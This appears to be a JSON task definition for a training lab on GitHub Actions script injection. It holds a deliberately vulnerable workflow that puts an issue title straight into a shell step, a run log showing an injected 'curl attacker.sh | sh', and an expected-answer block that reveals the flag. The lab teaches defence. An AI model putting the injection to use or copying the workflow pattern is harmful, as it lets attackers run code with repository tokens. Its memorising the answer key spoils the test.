@@ -1,0 +1,33 @@
+{
+  "id": "cloud-cicd-github-actions",
+  "workdir": "/home/student/ghainject",
+  "hostname": "lab",
+  "vars": {},
+  "expect": {
+    "file": "/home/student/ghainject/found.txt",
+    "contains": "nto{gh4_scr1pt_1nj3ct}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/ghainject",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/ghainject/task.md",
+      "text": "# Задача: GHA injection\n\nРазбери workflow и лог. Найди инъекцию и флаг.\n\nИнструменты: `cat`, `grep`.\n"
+    },
+    {
+      "path": "/home/student/ghainject/notes.md",
+      "text": "Заметки\n------\n- Опасность: недоверенный контекст (${{ github.event.* }}) в run:/script.\n- Инъекция выполняется с правами GITHUB_TOKEN.\n"
+    },
+    {
+      "path": "/home/student/ghainject/workflow.yml",
+      "text": "name: triage\non: issues\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"${{ github.event.issue.title }}\"\n"
+    },
+    {
+      "path": "/home/student/ghainject/run-log.txt",
+      "text": "Run echo \"fix typo\"; curl attacker.sh | sh\nGITHUB_TOKEN scopes: repo, workflow\nexfiltrated secret: nto{gh4_scr1pt_1nj3ct}\n"
+    }
+  ],
+  "tools": {}
+}
